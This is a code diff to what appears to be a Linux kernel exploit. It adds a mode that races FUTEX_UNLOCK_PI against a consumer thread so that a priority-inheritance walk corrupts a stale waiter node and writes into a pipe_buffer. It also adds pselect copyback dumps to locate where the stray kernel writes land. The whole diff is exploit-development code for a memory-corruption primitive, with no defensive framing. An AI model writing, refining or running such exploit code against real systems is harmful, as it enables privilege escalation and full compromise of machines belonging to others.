@@ -25,6 +25,7 @@ static atomic_int slide_waiter_ready;
 static atomic_int slide_waiter_waiting;
 static atomic_int slide_owner_started;
 static atomic_int slide_owner_acquired;
+static atomic_int slide_owner_unlock_go;
 static atomic_int slide_deadlock_seen;
 static atomic_int slide_waiter_ok;
 static atomic_int slide_route_done;
@@ -329,8 +330,36 @@ void slide_pselect_stack_copy(void) {
           atomic_load(&slide_consume_sched_ok),
           atomic_load(&slide_consume_last_sched_ret),
           atomic_load(&slide_consume_last_sched_errno));
-  atomic_store(&slide_pselect_write_window,
-               ret > 0 && atomic_load(&slide_consume_sched_ok) > 0);
+  if (getenv("SLIDE_OWNER_UNLOCK")) {
+    /* The owner-unlock write targets the pipe_buffer, not the pselect
+     * res sets, so pselect ret stays 0 on a successful write.  Report
+     * the window on the trigger alone and let the pipe oracle decide. */
+    atomic_store(&slide_pselect_write_window,
+                 atomic_load(&slide_consume_sched_ok) > 0);
+  } else {
+    atomic_store(&slide_pselect_write_window,
+                 ret > 0 && atomic_load(&slide_consume_sched_ok) > 0);
+  }
+
+  if (ret != 0) {
+    /* The kernel copies back ceil(nfds/64)*8 bytes (40B = 5 words for
+     * nfds=320) from the res_* halves of stack_fds.  Whatever the PI walk
+     * changed shows up here as ready bits — dump exactly which words were
+     * set so we can tell "walk modified the stale waiter node" apart from
+     * "stray write landed in the res sets". */
+    const fd_set *sets[3] = {&in, &out, &ex};
+    const char *set_names[3] = {"in", "out", "ex"};
+    for (int set = 0; set < 3; set++) {
+      const uint64_t *words = (const uint64_t *)sets[set];
+      for (size_t word = 0; word < sizeof(fd_set) / sizeof(uint64_t);
+           word++) {
+        if (words[word]) {
+          pr_info("slide pselect copyback set=%s word=%zu value=%016llx\n",
+                  set_names[set], word, (unsigned long long)words[word]);
+        }
+      }
+    }
+  }
 
   close(high_read);
   if (block_fd != pipefd[0]) {
@@ -398,8 +427,16 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
       atomic_store(&slide_consume_enter_sched, entered);
       atomic_store(&slide_consume_calls, calls + 1);
       *errno_ptr = 0;
-      long ret = sched_setattr_tid(tid, (calls % 19) + 1);
-      int saved_errno = *errno_ptr;
+      long ret;
+      int saved_errno;
+      if (getenv("SLIDE_OWNER_UNLOCK")) {
+        atomic_store(&slide_owner_unlock_go, 1);
+        ret = 0;
+        saved_errno = 0;
+      } else {
+        ret = sched_setattr_tid(tid, (calls % 19) + 1);
+        saved_errno = *errno_ptr;
+      }
       atomic_store(&slide_consume_last_sched_ret, (int)ret);
       atomic_store(&slide_consume_last_sched_errno, saved_errno);
       if (ret == 0) {
@@ -487,6 +524,18 @@ void *slide_owner_thread(void *arg __attribute__((unused))) {
     return NULL;
   }
   atomic_store(&slide_owner_acquired, 1);
+
+  if (getenv("SLIDE_OWNER_UNLOCK")) {
+    while (!atomic_load(&slide_owner_unlock_go)) {
+      __asm__ volatile("yield" ::: "memory");
+    }
+    errno = 0;
+    long unlock_ret = futex_op(&slide_f_pi_target, FUTEX_UNLOCK_PI, 0, NULL,
+                               NULL, 0);
+    int unlock_errno = errno;
+    pr_info("slide owner unlock_pi ret=%ld errno=%d\n", unlock_ret,
+            unlock_errno);
+  }
 
   for (;;) {
     sleep(1);
